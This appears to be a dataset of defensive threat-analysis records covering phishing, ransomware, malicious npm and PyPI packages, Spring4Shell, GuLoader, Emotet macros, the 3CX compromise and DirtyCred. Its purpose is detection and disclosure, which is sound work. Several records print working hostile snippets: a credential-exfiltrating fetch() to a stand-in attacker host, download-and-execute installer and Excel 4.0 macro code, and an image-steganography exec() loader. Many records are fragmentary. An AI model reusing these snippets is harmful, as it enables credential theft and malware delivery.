malice_analysis.violated_expectations: Legitimate authentication handlers process credentials solely for verification and do not store or transmit them to external parties; exfiltration of authentication data is never part of normal operations.
malice_analysis.similar_legitimate_use: There is no legitimate use case for exfiltrating user credentials or session cookies from authentication handlers.
key_indicators: Credential and session cookie extraction from authentication requests
Data exfiltration to external (attacker-controlled) servers
Local logging or storage of sensitive authentication data outside of secure credential stores

execution_context.trigger: runtime (when victim enters credentials into phishing login form)
execution_context.file_location: JavaScript injected into phishing login page (client-side code)
required_permissions: network (to send exfiltrated data to attacker-controlled server)

malicious_snippets.code_snippet:
<script>
fetch('https://attacker-server.com/log', {
  method: 'POST',
  body: JSON.stringify({
    username: document.getElementById('username').value,
    password: document.getElementById('password').value
  })
});
</script>
malicious_snippets.code_behavior: At runtime, when a victim enters credentials into the phishing login form, the injected JavaScript captures the entered username and password and sends them via HTTP POST to an attacker-controlled server, resulting in immediate credential exfiltration.

malice_analysis.why_suspicious: Injecting JavaScript to capture and exfiltrate credentials from a login form to an external domain is a classic and highly effective phishing technique.
malice_analysis.violated_expectations: Legitimate login pages only transmit credentials to trusted authentication endpoints and never to unrelated or external domains.
malice_analysis.similar_legitimate_use: Form data may be sent to legitimate authentication APIs within the same domain or trusted infrastructure, but never to unknown or attacker-controlled domains.
key_indicators: JavaScript exfiltration of credentials from login forms
Network requests (fetch/XHR) to attacker-controlled or non-corporate domains
Presence of injected or obfuscated JavaScript in login pages

attack_chain.action: Threat actor sends phishing email containing a malicious link or attachment to the target user.
attack_chain.leads_to: Victim clicks the link and is directed to an attacker-controlled phishing site.

attack_chain.action: Victim visits the phishing site, which proxies the legitimate login page using EvilGinx, Modlishka, or Murena frameworks.
attack_chain.leads_to: Victim is presented with a convincing login page and enters credentials.

attack_chain.action: Phishing framework intercepts credentials and session cookies during the authentication flow.
attack_chain.leads_to: Credentials and session data are exfiltrated to attacker infrastructure.

attack_chain.action: Attacker uses harvested credentials and session cookies to access the victim's email account and set up forwarding rules for persistent access.
attack_chain.leads_to: Attacker achieves ongoing access and can impersonate the victim or steal additional data.

behavioral_signatures: Proxying authentication flows to legitimate services with credential and session interception logic present in server-side code
Injected JavaScript or server-side code exfiltrating credentials to non-corporate or attacker-controlled domains
Phishing sites that closely mimic legitimate login portals but are hosted on suspicious or lookalike domains
Unusual authentication flows where credentials are processed by non-standard infrastructure
file_indicators: Presence of EvilGinx, Modlishka, or Murena framework files or directories on web servers (e.g., evilginx2/, modlishka/, murena/)
Custom plugins or modules for credential/session capture within these frameworks
Injected or unauthorized JavaScript in login pages that sends data to external domains
network_indicators: Outbound HTTP/HTTPS requests to domains such as cache-dns[.]com, cache-pdf[.]com, docs-cache[.]com, officeonline365[.]live, cloud-docs[.]com
Phishing infrastructure using lookalike or typosquatted domains resembling legitimate services
Unusual POST requests from login pages to non-corporate or unrecognized endpoints, especially during authentication
TLS certificates issued to suspicious or recently registered domains mimicking legitimate brands
detection_knowledge.how_to_detect: Monitor web servers for the presence of EvilGinx, Modlishka, or Murena framework files and directories, especially those proxying authentication flows to major cloud providers. Detect JavaScript or server-side code that exfiltrates credentials to external or attacker-controlled domains. Flag network traffic to known phishing domains (see IOCs) and lookalike login portals. Use email security solutions to block or quarantine messages containing links to these domains. Monitor for anomalous authentication activity, such as new email forwarding rules, logins from unexpected locations, or session cookie reuse. Implement automated scanning for unauthorized JavaScript in login pages and for suspicious proxy configurations on web infrastructure.

package_info.why_malicious: Trigona is a ransomware family targeting Windows systems. It encrypts user files using strong cryptography, appends a custom extension (such as '._locked'), and drops ransom notes demanding payment in cryptocurrency (Monero/XMR) for decryption. The malware also threatens to leak exfiltrated data if the ransom is not paid, employing double-extortion tactics. Its sole purpose is to extort victims, disrupt operations, and compromise data confidentiality and availability.

execution_context.trigger: runtime (upon execution of the ransomware binary, typically after initial infection vector such as phishing or RDP compromise)
execution_context.file_location: Trigona ransomware executable (Windows PE file, typically dropped in a temporary or user-accessible directory)
required_permissions: filesystem (read/write/modify/delete access to user and system files)
network (for potential data exfiltration or C2 communication)

malicious_snippets.code_snippet: Encrypts files on the compromised machine and appends a '._locked' extension to each encrypted file.
malicious_snippets.code_language: native Windows binary (likely C/C++ or Delphi)
malicious_snippets.code_behavior: At runtime, the code enumerates files on the local filesystem, encrypts their contents using a cryptographic algorithm (such as AES or RSA), and renames each file by appending a '._locked' extension, rendering the files inaccessible to the user.

malice_analysis.why_suspicious: Automated, mass file encryption and extension renaming are definitive ransomware behaviors designed to deny user access to data and coerce payment.
malice_analysis.violated_expectations: Legitimate software does not encrypt user files in bulk or alter file extensions without explicit, informed user consent and clear purpose.
malice_analysis.similar_legitimate_use: Backup or security software may encrypt files, but only with user approval, for backup or archival purposes, and typically does not change file extensions in this manner.
key_indicators: Bulk file enumeration and encryption
Addition of unique extension (e.g., '._locked') to user files
No user interaction or consent required for encryption
Use of strong cryptographic algorithms for file locking

execution_context.trigger: runtime (immediately after or during the file encryption process)
execution_context.file_location: Filesystem root or affected directories (drops ransom note as 'how_to_decrypt.hta' in each directory with encrypted files)

malicious_snippets.code_snippet: Drops a ransom note file named 'how_to_decrypt.hta' containing instructions for the victim, including a Tor site link or attacker email.
malicious_snippets.code_language: HTML (HTA file generated by the ransomware binary)
malicious_snippets.code_behavior: At runtime, after encrypting files, the code creates a ransom note file named 'how_to_decrypt.hta' in each affected directory, providing instructions for contacting the attacker, payment details (typically Monero/XMR), and links to a Tor site or attacker-controlled email address.

malice_analysis.why_suspicious: The creation of ransom notes with payment instructions and anonymous contact methods is a hallmark of ransomware, serving to extort the victim and facilitate illicit payment.
malice_analysis.violated_expectations: Legitimate software does not create files demanding payment for data recovery or provide instructions to contact anonymous parties.
malice_analysis.similar_legitimate_use: No legitimate software should demand ransom for file access or provide payment instructions in this manner.
key_indicators: Creation of ransom note files named 'how_to_decrypt.hta'
Inclusion of Tor site URLs or anonymous email addresses
Explicit instructions for cryptocurrency payment (Monero/XMR)
Threats of data leak or non-recovery if ransom is not paid

execution_context.trigger: runtime (after encryption and ransom note drop, when victim follows instructions)
execution_context.file_location: Network communication initiated by the ransomware process or by the victim using provided contact methods
required_permissions: network (outbound connections to Tor network or email services)

malicious_snippets.code_snippet: Connects to a Tor site or sends email to attacker as instructed in the ransom note (victim-initiated, but infrastructure is set up by attacker).
malicious_snippets.code_language: network protocol (HTTP/S over Tor, SMTP for email)
malicious_snippets.code_behavior: After encryption, the victim is instructed to contact the attacker via a Tor site or email address provided in the ransom note. This communication channel is used to negotiate ransom payment, provide proof of decryption, and potentially facilitate data exfiltration or further extortion.

malice_analysis.why_suspicious: Use of Tor and anonymous email for ransom payment and communication is a strong indicator of criminal activity, designed to evade law enforcement and hinder attribution.
malice_analysis.violated_expectations: Legitimate software never requires users to contact anonymous parties via Tor or email for data recovery or payment.
malice_analysis.similar_legitimate_use: Privacy-focused applications may use Tor for anonymity, but not for extortion or ransom payment facilitation.
key_indicators: Presence of Tor site URLs or anonymous email addresses in ransom notes
Instructions for cryptocurrency payment (Monero/XMR)
Victim support or chat functionality hosted on Tor sites
Outbound network connections to Tor entry nodes or hidden services

attack_chain.action: Ransomware binary is executed on the victim's Windows system, typically delivered via phishing, RDP compromise, or as a secondary payload from other malware.
attack_chain.leads_to: File encryption and extension change

attack_chain.action: Ransomware enumerates and encrypts files, appending the '._locked' extension to each encrypted file.
attack_chain.leads_to: Ransom note creation

attack_chain.action: Ransomware drops 'how_to_decrypt.hta' ransom note in each affected directory, providing payment and contact instructions.
attack_chain.leads_to: Victim is instructed to contact attacker

attack_chain.action: Victim is instructed to contact attacker via Tor site or anonymous email and pay ransom in Monero (XMR), under threat of data leak or permanent data loss.

behavioral_signatures: Bulk file encryption and renaming with '._locked' extension on user and system files
Automated creation of ransom note files named 'how_to_decrypt.hta' in multiple directories
Presence of instructions referencing Tor sites or anonymous email addresses for ransom payment
Unusual outbound network connections to Tor entry nodes or hidden services
file_indicators: Files with '._locked' extension in user directories
Presence of 'how_to_decrypt.hta' files in multiple directories
Unusual modification timestamps on large numbers of files within a short time window

References to attacker-controlled email addresses or Tor sites in ransom notes
Potential C2 communication or data exfiltration attempts over anonymized channels
detection_knowledge.how_to_detect: Monitor for rapid, bulk file modifications and the creation of files with the '._locked' extension. Detect the appearance of ransom note files such as 'how_to_decrypt.hta' in user or system directories. Analyze process behavior for attempts to initiate outbound connections to the Tor network or access .onion addresses. Scan ransom notes for references to cryptocurrency payment (Monero/XMR), Tor sites, or anonymous email addresses. Use file hash IOCs to block known Trigona binaries and employ endpoint detection and response (EDR) solutions to identify suspicious encryption activity.

package_info.why_malicious: The package 'discord-hacker' contains code that exfiltrates sensitive Discord authentication tokens from the environment and sends them to an external attacker-controlled server during package installation, enabling credential theft and potential account compromise.

malicious_snippets.code_behavior: During installation, the code reads the DISCORD_TOKEN environment variable and sends its value via HTTPS POST to malicious.example.com/api/steal, resulting in credential exfiltration.

attack_chain.action: Reads the DISCORD_TOKEN environment variable during package installation.
attack_chain.leads_to: Obtains sensitive Discord authentication token from the environment.

attack_chain.action: Sends the stolen token to an external attacker-controlled server via HTTPS POST.
attack_chain.leads_to: Exfiltrates credentials to the attacker, enabling account compromise.

behavioral_signatures: Access to DISCORD_TOKEN environment variable during npm package installation.
Outbound HTTPS POST requests to malicious.example.com/api/steal from install scripts.
file_indicators: postinstall.js containing code that references process.env.DISCORD_TOKEN
Presence of HTTPS request logic targeting malicious.example.com in install scripts
network_indicators: malicious.example.com
HTTPS POST requests to /api/steal endpoint during package installation

package_info.package_versions: 5.3.0 to 5.3.17, 5.2.0 to 5.2.19, and all older versions
package_info.why_malicious: These versions of the Spring Framework are vulnerable to a critical remote code execution (RCE) flaw known as Spring4Shell (CVE-2022-22965). Under specific deployment conditions (Spring MVC or Spring WebFlux applications packaged as WAR files and deployed on Tomcat with JDK 9+), attackers can exploit unsafe data binding to manipulate internal class loader properties and write arbitrary files (such as web shells) to the server, enabling full system compromise.

execution_context.trigger: At runtime, during HTTP request processing
execution_context.file_location: Within the spring-beans module, invoked via spring-webmvc or spring-webflux dependency, typically in a WAR deployment on Apache Tomcat with JDK 9+
required_permissions: filesystem (to write files to arbitrary locations)
process_execution (to enable execution of uploaded web shells or files)

malicious_snippets.code_snippet: No explicit code snippet is provided in the report. The vulnerability arises from the Spring Framework's data binding mechanism, which allows HTTP request parameters to be bound to Java object properties. Attackers can craft HTTP requests with parameters such as 'class.module.classLoader.resources.context.parent.pipeline.first.pattern', 'suffix', 'directory', 'prefix', and 'fileDateFormat' to manipulate the logging configuration and write arbitrary files (e.g., a web shell) to the web root directory.
malicious_snippets.code_behavior: At runtime, during HTTP request processing, the vulnerable data binding mechanism processes attacker-supplied HTTP parameters that target internal class loader and file path properties, allowing arbitrary file creation in the web root directory, which results in remote code execution when the attacker accesses the uploaded web shell.

malice_analysis.why_suspicious: Allowing external HTTP parameters to set internal framework or class loader properties and write files to arbitrary locations is highly abnormal and enables attackers to bypass application logic and gain direct control over the server.
malice_analysis.violated_expectations: Normal data binding should only map safe, explicitly defined user input to application objects, never allowing modification of internal class loader, logging, or file system properties. The vulnerability violates the principle of least privilege and safe input handling.
malice_analysis.similar_legitimate_use: Legitimate use of data binding restricts property mapping to known, safe fields (e.g., form input to DTOs), never to internal framework or server configuration properties.
key_indicators: HTTP requests containing parameters such as 'class.module.classLoader.resources.context.parent.pipeline.first.pattern', 'suffix', 'directory', 'prefix', or 'fileDateFormat'
Creation of new .jsp, .war, or executable files in the web root or application directories immediately following suspicious HTTP requests
Execution of newly created files (e.g., web shells) after file creation
Unusual modification of Tomcat logging configuration via HTTP parameters

attack_chain.action: Attacker sends a specially crafted HTTP request to the vulnerable Spring application, including parameters targeting internal class loader and file path properties.
attack_chain.leads_to: Manipulation of internal class loader and logging properties, setting up conditions for arbitrary file write.

attack_chain.action: The vulnerable data binding mechanism processes the request, allowing attacker-controlled values to be set for properties such as file path and file name.
attack_chain.leads_to: Arbitrary file write (e.g., web shell) to the server's web root or application directory.

attack_chain.action: Attacker accesses the uploaded web shell or malicious file via HTTP to execute arbitrary commands on the server.
attack_chain.leads_to: Remote code execution and potential full system compromise.

behavioral_signatures: HTTP requests containing parameters such as 'class.module.classLoader.resources.context.parent.pipeline.first.pattern', 'suffix', 'directory', 'prefix', or 'fileDateFormat'
Unexpected creation of .jsp, .war, or executable files in web root or application directories
Execution of new files (e.g., web shells) shortly after suspicious HTTP requests
Modification of Tomcat logging configuration via HTTP parameters
file_indicators: Unexpected .jsp, .war, or executable files in the web root (e.g., /webapps/ROOT/)
Files with names or content not matching normal deployment artifacts, such as web shells (e.g., cmd.jsp, shell.jsp)
Recently modified files in application directories that do not match deployment timestamps
network_indicators: Unusual HTTP POST or GET requests with property manipulation parameters targeting internal Java or Tomcat properties
Outbound connections initiated by newly created web shells or files
Access attempts to newly created .jsp or .war files in the web root
detection_knowledge.how_to_detect: Monitor HTTP requests for suspicious parameters that attempt to set internal class loader, logging, or file path properties (e.g., 'class.module.classLoader.resources.context.parent.pipeline.first.pattern'). Watch for new .jsp, .war, or executable files appearing in the web root or application directories, especially those with names or content inconsistent with normal deployments. Correlate these events with subsequent command execution or outbound network activity. Deploy web application firewalls (WAFs) with rules targeting known Spring4Shell exploit patterns, and use file integrity monitoring to detect unauthorized file creation or modification.

package_info.why_malicious: The package is malicious because it uses steganography to conceal executable code within an image file bundled in the package. Upon import, it extracts and executes this hidden code, enabling the attacker to run arbitrary payloads on the victim's system without detection. This deliberate evasion technique targets developer environments and open-source projects, posing a significant supply chain risk.

execution_context.file_location: Python module file (e.g., __init__.py or main module)
required_permissions: filesystem (read access to bundled image file)

malicious_snippets.code_snippet:
from PIL import Image
import base64
img = Image.open('hidden.png')
encoded = ''
for pixel in img.getdata():
    encoded += chr(pixel[0])
exec(base64.b64decode(encoded))
malicious_snippets.code_behavior: At import-time, the code loads a bundled PNG image file, iterates over its pixel data to reconstruct a base64-encoded string, decodes this string to obtain executable Python code, and executes it using exec(), resulting in stealthy execution of attacker-controlled payloads.

malice_analysis.why_suspicious: The code leverages steganography to hide executable code within an image file and dynamically executes it at import-time. This approach is designed to evade static analysis and traditional security tools, as the actual malicious logic is not present in plain text within the source code.
malice_analysis.violated_expectations: Legitimate Python packages do not extract and execute code from image files during import. Standard packages would not obfuscate code execution or use image files as containers for executable payloads.
malice_analysis.similar_legitimate_use: Steganography may be used in academic research, CTF challenges, or security tools for demonstration purposes, but it is not appropriate in production packages or as part of normal dependency behavior.
key_indicators: Import-time execution of code via exec()
Extraction of data from image pixel values using PIL.Image
Base64 decoding of data reconstructed from image
Presence and use of a bundled image file (e.g., hidden.png) in the package
No explicit code payload in source; payload is hidden in non-code resource

attack_chain.action: User installs or imports the malicious PyPI package, triggering the import-time execution of the code in the module.
attack_chain.leads_to: The package loads the bundled image file, extracts the hidden base64-encoded payload, decodes it, and executes the resulting code on the victim's system.

attack_chain.action: The decoded and executed payload performs further malicious actions as defined by the attacker, such as data exfiltration, system compromise, or downloading additional malware.
attack_chain.leads_to: System compromise, data theft, or further malware installation depending on the payload's logic.

behavioral_signatures: Import-time execution of code extracted from image files
Use of steganography (image pixel data extraction) in package code
Dynamic code execution via exec() or eval() on data decoded from non-code files
Absence of explicit malicious payload in source code; payload is reconstructed at runtime
file_indicators: Presence of PNG or other image files (e.g., hidden.png) in Python package directories
References to image files in __init__.py or main module
Code patterns involving PIL.Image and base64 decoding in import-time code
Unusual access to bundled non-code files during module import
network_indicators: Potential outbound connections initiated by the decoded payload (not directly shown in snippet, but likely in real-world attacks if the payload exfiltrates data or contacts C2 servers)
detection_knowledge.how_to_detect: Scan Python packages for code that loads and processes image files at import-time, especially if the code extracts data from pixel values and reconstructs executable code. Flag packages that use exec() or eval() on data decoded from non-code files such as images. Monitor for unexpected image files bundled with packages and review their usage in code. Use static and dynamic analysis to detect steganographic techniques and dynamic code execution. Correlate the presence of image files with suspicious import-time activity to reduce false positives.

package_info.package_manager: N/A (malware distributed as NSIS installer, not a package manager)
package_info.why_malicious: The NSIS executables act as a delivery mechanism for GuLoader malware, which is engineered to covertly download and execute additional malicious payloads from attacker-controlled infrastructure. This enables initial compromise, persistent access, and further exploitation of targeted systems, particularly in the e-commerce sector.

execution_context.trigger: At runtime, when the user executes the NSIS installer
execution_context.file_location: Malicious NSIS executable (installer file distributed to victims)

malicious_snippets.code_snippet:
System::Call 'kernel32::URLDownloadToFileA(i 0, t "http://malicious-domain.com/payload.exe", t "$TEMP\payload.exe", i 0, i 0)'
ExecWait '$TEMP\payload.exe'
malicious_snippets.code_behavior: At runtime, the code uses the URLDownloadToFileA Windows API to download an executable from a remote attacker-controlled domain to the system's temporary directory, then immediately executes the downloaded file, resulting in the installation and execution of additional malware payloads.

malice_analysis.why_suspicious: The installer downloads and executes a remote executable without user consent or verification, a hallmark of malware loaders. The use of URLDownloadToFileA with an external, hardcoded domain and immediate execution of the downloaded file is highly indicative of malicious intent.
malice_analysis.violated_expectations: Legitimate NSIS installers should only install pre-packaged, verified application files and should not fetch and execute arbitrary code from the internet, especially without user notification or digital signature verification.
malice_analysis.similar_legitimate_use: Some legitimate updaters may download updates, but they typically verify digital signatures, notify the user, and do not execute untrusted code from unverified sources.
key_indicators: Hardcoded URL in URLDownloadToFileA call pointing to an external, non-corporate domain
Downloaded executable written to $TEMP directory
Immediate execution of the downloaded file via ExecWait
No user notification or consent for network activity or code execution
Absence of digital signature or integrity verification for downloaded payload

attack_chain.action: User receives and executes a malicious NSIS installer, believing it to be a legitimate file.
attack_chain.leads_to: The installer downloads and executes an additional payload (GuLoader) from an attacker-controlled domain, initiating the infection process.

attack_chain.action: The downloaded GuLoader payload establishes persistence and/or downloads further malware (such as remote access trojans or credential stealers).
attack_chain.leads_to: Full compromise of the victim system, including potential data exfiltration, credential theft, or lateral movement within the network.

behavioral_signatures: NSIS installer process initiating outbound network connections to download executables
Execution of files from temporary directories (e.g., $TEMP) immediately after download by installer processes
NSIS installer invoking Windows API calls such as URLDownloadToFileA with hardcoded external URLs
file_indicators: NSIS installer files containing embedded URLDownloadToFileA calls referencing external domains
Executables dropped to $TEMP or similar temporary directories by NSIS installers
Unexpected NSIS installer files received via email or downloaded from untrusted sources
network_indicators: Outbound HTTP/HTTPS connections from NSIS installer processes to known malicious domains or IP addresses used for payload delivery
Unusual network activity from installer processes, especially to non-corporate or suspicious domains
detection_knowledge.how_to_detect: Monitor for NSIS installer processes that initiate outbound network connections to download executables, particularly when the destination is a non-corporate or suspicious domain. Flag installers that write and execute files from temporary directories immediately after download. Use sandbox analysis to inspect installer behavior for embedded download-and-execute logic, and scan for hardcoded external URLs within NSIS scripts. Correlate file creation and process execution events with network activity to identify malicious installer behavior.

package_info.package_versions: All versions between January 31, 2021 and April 1, 2021 (exact window per Codecov disclosure)

required_permissions: read access to repository metadata (via git)

malice_analysis.similar_legitimate_use: A legitimate script might send code coverage metrics to a trusted analytics endpoint, but would never exfiltrate environment variables or repository configuration data.

Use of 'git remote -v' to collect repository URLs
Outbound HTTP POST to attacker-controlled IP/domain (not Codecov)

Inspect scripts for commands that exfiltrate environment variables or repository information to external endpoints. Review CI logs for unexpected data transfer or use of 'env', 'git remote -v', and 'curl' in combination. Compare scripts against official Codecov releases to detect unauthorized modifications.

package_info.package_versions: All versions published between April 2023 and October 2023, prior to the update following Socket's disclosure (exact version numbers not specified in the report).
package_info.why_malicious: The package covertly collects sensitive developer information, specifically the operating system username and Git configuration details (user.name and user.email), and exfiltrates this data to an external, undocumented server during installation without user consent or disclosure. This constitutes spyware/hidden telemetry, violating user privacy, trust, and npm ecosystem norms.

required_permissions: filesystem (read access to user home directory and .gitconfig)

malicious_snippets.code_behavior: At preinstall time, the code reads the user's OS username and parses the ~/.gitconfig file to extract the Git username and email, then dynamically constructs a URL embedding these values as query parameters and sends them via HTTP or HTTPS GET request to an external server (http://localhost:1962 for a specific user or https://2tak.l.serverhost.name:1962 for others), resulting in exfiltration of sensitive developer information.

malice_analysis.why_suspicious: The code surreptitiously collects the user's OS username and Git configuration (user.name and user.email) and transmits this data to an undocumented, external server during the package's preinstall phase, without any user notification or consent. This is a hallmark of spyware and hidden telemetry.
malice_analysis.violated_expectations: Legitimate npm packages should not access or transmit user identity or Git configuration data during installation, especially without explicit user consent, documentation, or a clear opt-in mechanism. Such behavior is a severe violation of user trust and privacy expectations in open source ecosystems.
malice_analysis.similar_legitimate_use: Some developer tools may collect telemetry or usage statistics, but only with clear user opt-in, transparent documentation, and anonymization of sensitive data. Legitimate telemetry never exfiltrates personal identity information without disclosure.
key_indicators: Reads ~/.gitconfig to extract user.name and user.email during preinstall.
Accesses OS-level username via os.userInfo().
Constructs outbound HTTP/HTTPS requests embedding sensitive data as query parameters.

package_info.why_malicious: The Excel file contains a hidden Excel 4.0 macro that automatically downloads and executes a malicious DLL payload (Emotet) from attacker-controlled servers when the document is opened and macros are enabled. malicious_snippets.code_snippet:
Excel_BuiltIn_Auto_Open macro in a cell (hidden in column G) that executes a command to download a payload from one of several URLs and saves it as oxnv1.ooccxx through oxnv4.oocccxx, then launches it via regsvr32.exe:

=CALL("urlmon","URLDownloadToFileA","JJJJC",0,"http://[malicious_url]/[path]","..\oxnv1.ooccxx",0,0)
=EXEC("C:\Windows\System32\regsvr32.exe /S ..\oxnv1.ooccxx")
malicious_snippets.code_behavior: At import-time, the macro uses Excel_BuiltIn_Auto_Open to automatically execute, calls URLDownloadToFileA to download a DLL payload from a hardcoded list of attacker-controlled URLs, writes the DLL to disk as oxnv1.ooccxx through oxnv4.oocccxx, and then invokes regsvr32.exe to execute the downloaded DLL, resulting in remote code execution.

malice_analysis.why_suspicious: The use of Excel 4.0 (XLM) macros, especially hidden in protected worksheets and triggered automatically on file open, is highly unusual in legitimate documents. The macro's behavior of downloading and executing binaries from the internet is a clear indicator of malicious intent.
malice_analysis.violated_expectations: Legitimate Excel documents do not contain macros that download and execute code from external sources. Normal macros are used for automating spreadsheet tasks, not for invoking system-level commands or launching executables.
malice_analysis.similar_legitimate_use: Some enterprise automation may use macros to download templates or data, but never to download and execute binaries or invoke regsvr32.exe.

malice_analysis.why_suspicious: Self-replication to random locations in System32, randomization of file names, and the use of over 270 randomized export functions are advanced anti-analysis and evasion techniques. malice_analysis.similar_legitimate_use: Some legitimate installers may copy files to System32, but not with randomization, anti-analysis features, or repeated regsvr32.exe invocation.

package_info.why_malicious: The 'imds_v1_usage' rule is not itself malicious, but is designed to detect potentially malicious or risky behavior: specifically, the use of the insecure EC2 Instance Metadata Service v1 (IMDSv1), which is vulnerable to SSRF and credential theft attacks. Continued use of IMDSv1 is considered a security risk because it allows attackers to more easily obtain AWS credentials from EC2 instances. The rule is critical for identifying workloads that have not migrated to the more secure IMDSv2 protocol.

execution_context.file_location: N/A (network traffic monitored by eBPF probes in kernel space)

malicious_snippets.code_behavior: At runtime, the code inspects all outbound network traffic from processes or containers, identifies HTTP/1.x requests to the EC2 metadata IP (169.254.169.254) that lack the 'X-aws-ec2-metadata-token' header, logs detailed process and request context, and generates a detection signal for IMDSv1 usage.

malice_analysis.why_suspicious: Accessing the EC2 metadata service at 169.254.169.254 without the 'X-aws-ec2-metadata-token' header indicates use of the deprecated and insecure IMDSv1 protocol. This behavior is a strong indicator of potential SSRF exploitation or misconfigured workloads, as IMDSv1 allows attackers to retrieve AWS credentials if they can induce such requests.
malice_analysis.violated_expectations: Normal, secure workloads should exclusively use IMDSv2, which requires a session token for metadata access. Use of IMDSv1 is deprecated by AWS and considered a security anti-pattern, as it exposes instances to credential theft via SSRF or local privilege escalation.
malice_analysis.similar_legitimate_use: Some legacy applications or outdated libraries may still use IMDSv1 unintentionally, especially if not updated to support IMDSv2. However, this is not recommended and should be remediated.
key_indicators: Outbound HTTP/1.x requests to 169.254.169.254 without 'X-aws-ec2-metadata-token' header
Process and user agent context showing non-compliant or legacy code making metadata requests
Absence of IMDSv2 token in requests to EC2 metadata endpoint

attack_chain.action: A process or container initiates an HTTP/1.x request to the EC2 metadata service (169.254.169.254) without including the 'X-aws-ec2-metadata-token' header, indicating IMDSv1 usage.
attack_chain.leads_to: Potential exposure of instance credentials if the request is triggered by an attacker via SSRF or local compromise.

attack_chain.action: The eBPF-based detection rule inspects the network request, logs the process, request, and user agent details, and generates a detection signal for security teams.
attack_chain.leads_to: Security teams are alerted to the presence of IMDSv1 usage and can take remediation actions, such as migrating the workload to IMDSv2 or investigating for possible exploitation.

behavioral_signatures: Outbound HTTP/1.x requests to 169.254.169.254 without the 'X-aws-ec2-metadata-token' header
Processes or containers making direct calls to the EC2 metadata endpoint using HTTP/1.x without session token
file_indicators: No direct file indicators; detection is based on real-time network traffic and process context
network_indicators: Outbound HTTP requests to 169.254.169.254 (EC2 metadata IP) lacking the 'X-aws-ec2-metadata-token' header

detection_knowledge.how_to_detect: Instrument EC2 instances with eBPF or equivalent kernel-level monitoring to observe all outbound network traffic. Flag any HTTP/1.x requests to 169.254.169.254 that do not include the 'X-aws-ec2-metadata-token' header. Correlate these requests with process metadata (process name, path, arguments, user agent) to identify the responsible workload or container. Alert security teams for remediation and further investigation.

package_info.why_malicious: The 3CX Desktop App was compromised via a software supply chain attack, resulting in the distribution of malicious code within trusted application binaries. Attackers inserted malware into the app's build process, causing the application to fetch and execute additional payloads from a remote repository at runtime. This enabled information theft and further compromise of end-user systems through official update channels.

process execution (to load and execute embedded payloads)

These files are named with benign extensions such as .ico or .png and are stored in the app's resource or cache directories. The application then loads these files, interprets their contents, and executes embedded malicious code, which may be shellcode or a binary payload, using Electron's JavaScript execution context or by invoking system-level APIs.
malicious_snippets.code_language: JavaScript (Electron), with embedded binary or shellcode payloads
malicious_snippets.code_behavior: At application runtime, the code downloads files with benign extensions from a remote GitHub repository, writes them to the local filesystem, loads their contents as executable code using JavaScript or system APIs, and executes the payload, resulting in information theft and potential delivery of additional malware.

This behavior is highly abnormal for Electron apps, as static assets should not contain or execute code. The use of benign file extensions to disguise executable payloads is a clear evasion technique.
malice_analysis.violated_expectations: Normal Electron applications may load static assets (icons, images) from trusted sources, but they should never execute code from such files or fetch executable content from untrusted remote repositories. Executing code from files with non-executable extensions is a direct violation of standard application security practices.
malice_analysis.similar_legitimate_use: Legitimate applications may update icons or images from a trusted CDN, but they do not execute code from these files. Fetching and executing code from files with image extensions is not a legitimate use case.
key_indicators: Runtime network requests to public GitHub repositories (e.g., github.com/IconStorages) from production Electron apps
Files with benign extensions (e.g., .ico, .png) containing embedded executable payloads
Application logic that loads and executes code from non-executable file formats

package_info.why_malicious: PolarDNS is not inherently a malicious package, but it is designed to generate non-standard, malformed, and RFC-violating DNS responses for security research and penetration testing. Its capabilities can be abused to simulate or perform attacks such as DNS cache poisoning, resource exhaustion, and denial of service (DoS). In untrusted or production environments, its use poses significant risks to DNS infrastructure and client security.

execution_context.trigger: At runtime, upon receiving DNS queries

malicious_snippets.code_snippet:
Responds to DNS queries with non-standard, malformed, or RFC-violating DNS responses, such as:
- Alias (CNAME) chains and alias loops
- DNS header malformations (ID, Flags, number of sections)
- Injection of unsolicited records (cache poisoning)
- Injection of arbitrary bytes of arbitrary lengths
- Incomplete/empty/NULL byte(s) responses
- Compression issues (loops, invalid pointers)
- Slowly transmitted chunked responses
- Illegal labels or domain name lengths
- Arbitrary number of TXT records of arbitrary size
- Packet length manipulations (TCP)
malicious_snippets.code_behavior: At runtime, upon receiving a DNS query, the server processes the request and generates a custom DNS response with intentionally malformed or non-compliant fields, including header malformations, unsolicited records, or arbitrary data injection, resulting in the simulation or triggering of DNS protocol vulnerabilities.

malice_analysis.why_suspicious: The code is suspicious because it deliberately constructs DNS responses that violate protocol standards, such as malformed headers, alias loops, and unsolicited records. These behaviors can be exploited to test or attack DNS clients and resolvers, potentially leading to cache poisoning, resource exhaustion, or service disruption.
malice_analysis.violated_expectations: A standard DNS server is expected to generate well-formed, standards-compliant responses. PolarDNS intentionally violates these expectations by producing malformed, non-compliant, or malicious DNS packets.
malice_analysis.similar_legitimate_use: Legitimate uses include security research, protocol fuzzing, and robustness testing of DNS implementations to identify vulnerabilities before attackers can exploit them.
key_indicators: Generation of DNS responses with malformed headers (e.g., incorrect ID, flags, or section counts)
Injection of unsolicited or arbitrary records (e.g., for cache poisoning)
Creation of alias (CNAME) chains or loops
Responses containing compression pointer anomalies or invalid pointers

package_info.why_malicious: DirtyCred is not a software package but a privilege escalation exploitation technique targeting a flaw in the Linux kernel. It enables attackers to swap unprivileged process credentials with privileged ones by exploiting use-after-free or double-free vulnerabilities in kernel heap memory management, thereby bypassing standard kernel security controls and allowing local users to gain root or container escape.

execution_context.trigger: runtime (after successful exploitation of a use-after-free or double-free vulnerability)
execution_context.file_location: kernel heap memory (dynamic allocation of credential structures during process execution)
required_permissions: ability to trigger use-after-free or double-free on kernel credential objects

malicious_snippets.code_behavior: At runtime, the exploit triggers a use-after-free or double-free vulnerability on a kernel credential object, manipulates kernel heap allocation to replace the freed memory with a privileged credential structure, and causes the process to inherit elevated privileges, resulting in local privilege escalation.

malice_analysis.why_suspicious: This behavior is highly suspicious because it deliberately manipulates kernel memory management to replace a process's unprivileged credentials with privileged ones, a technique only used for unauthorized privilege escalation.
malice_analysis.violated_expectations: Under normal circumstances, kernel credential objects are strictly managed and isolated; user processes should never be able to influence or swap their credentials with privileged ones through heap manipulation or memory reuse.
malice_analysis.similar_legitimate_use: Legitimate kernel memory management may reuse heap memory for efficiency, but never for the purpose of credential swapping between different privilege levels or user contexts.
key_indicators: Use-after-free or double-free vulnerabilities exploited on kernel credential structures
Kernel heap memory reuse patterns involving credential objects
Unexpected privilege escalation in user processes without corresponding legitimate authorization events
Abnormal kernel log entries indicating memory corruption or credential structure anomalies

attack_chain.action: Attacker triggers a use-after-free or double-free vulnerability on a kernel object holding unprivileged credentials.
